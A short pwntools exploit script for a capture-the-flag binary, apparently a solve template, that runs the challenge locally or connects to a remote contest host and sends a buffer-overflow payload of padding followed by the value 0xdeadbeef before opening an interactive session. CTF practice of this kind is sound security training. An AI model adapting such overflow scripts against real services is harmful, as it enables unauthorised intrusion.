#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("alpha.hackac.live", 1000)

# good luck pwning :)
payload = flat(
    b"a"*0x10,
    0xdeadbeef
)
p.sendline(payload)

p.interactive()
